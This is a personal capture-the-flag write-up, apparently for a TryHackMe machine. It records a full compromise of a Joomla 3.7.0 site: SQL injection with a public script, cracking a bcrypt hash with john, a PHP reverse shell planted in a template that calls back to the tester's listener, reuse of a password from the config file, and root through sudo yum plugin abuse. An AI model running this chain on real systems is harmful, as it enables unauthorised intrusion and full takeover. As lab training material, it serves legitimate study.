## MACHINE IP
```bash
10.201.99.250
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Sat Sep 27 17:35:56 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.99.250
Nmap scan report for 10.201.99.250
Host is up (0.28s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 27 17:37:19 2025 -- 1 IP address (1 host up) scanned in 82.88 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```
## RECON
```bash
# Operating System
sh-4.2# cat /etc/*-release
CentOS Linux release 7.7.1908 (Core)
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"

# Credentials
jonah:spiderman123               //Found Post enumerations
jjameson:nv5uz9r3ZEDzVjNu        //Found Post enumerations
```
## ENUMERATION
```bash
# Port 80 Enumeration
Summary: 
Apache[2.4.6], Bootstrap, 
Cookies[eaa83fe8b963ab08ce9ab7d4a798de05], 
HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], 
HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], JQuery, 
MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], 
PHP[5.6.40], Script[application/json], 
X-Powered-By[PHP/5.6.40]

# From Nmap 
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40

- Joomla CMS

# Running joomscan
- Joomla 3.7.0

# robots.txt
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

# Shecking exploit for Joomla 3.7.0
https://www.exploit-db.com/exploits/42033
- Seems like SQLi using sqlmap
- Sadly I not planning to use sqlmap 
  
- Google Fu found
https://github.com/teranpeterson/Joomblah
python2 joomblah.py $url
Fetching CSRF token
Testing SQLi
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user [u'811', u'Super User', u'jonah', u'jonah@tryhackme.com', u'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', u'', u'']
Extracting sessions from fb9j5_session

# Raw Credentials 
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

- Idenntify hash using https://hashes.com/en/tools/hash_identifier
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm - Possible algorithms: bcrypt $2*$, Blowfish (Unix)

# Crack hash using john
sudo john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt sqlhash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:02:30 DONE (2025-09-27 18:30) 0.006655g/s 311.9p/s 311.9c/s 311.9C/s thelma1..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# Creds 
jonah:spiderman123

- Using Creds on joomla login http://10.201.99.250/administrator/index.php
```
## INITIAL SHELL
```bash
# Joomla to RCE 
- Edit the Template contents index.php to php-reverse-shell
- Payload used /usr/share/laudanum/php/php-reverse-shell.php // CHANGE LHOST LPORT
 
- Joomla > Extensions > Template > Edit "Protostar Details and Files" > index.php > save and close
  
# Start Listener
udo nc -nvlp 80                                                                                                                                                                         
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.99.250] 59016
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:18:29 up  1:14,  0 users,  load average: 0.01, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)     
```
## PRIVILEGE ESCALATION
```bash
# Found creds from 
/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';

- Found username jjameson from /etc/passwd
  
# Using creds jjameson:nv5uz9r3ZEDzVjNu to switch user
apache@dailybugle:/dev/shm$ su jjameson                                                                                                                                                      
Password:                                                                                                                                                                                    
[jjameson@dailybugle shm]$ sudo -l                                                                                                                                                           
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR       
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",               
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum   

# sudo -l (ALL) NOPASSWD: /usr/bin/yum    - GTFOBINS
```
## ROOT | ADMINISTRATOR - PWNED
```bash
[jjameson@dailybugle shm]$ TF=$(mktemp -d)
[jjameson@dailybugle shm]$ cat >$TF/x<<EOF
[main]
plugins=1                                                         
pluginpath=$TF                       
pluginconfpath=$TF
EOF
[jjameson@dailybugle shm]$ cat >$TF/y.conf<<EOF
[main]
enabled=1                                                         
EOF                       
[jjameson@dailybugle shm]$ cat >$TF/y.py<<EOF
import os
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
[jjameson@dailybugle shm]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# whoami
root
```
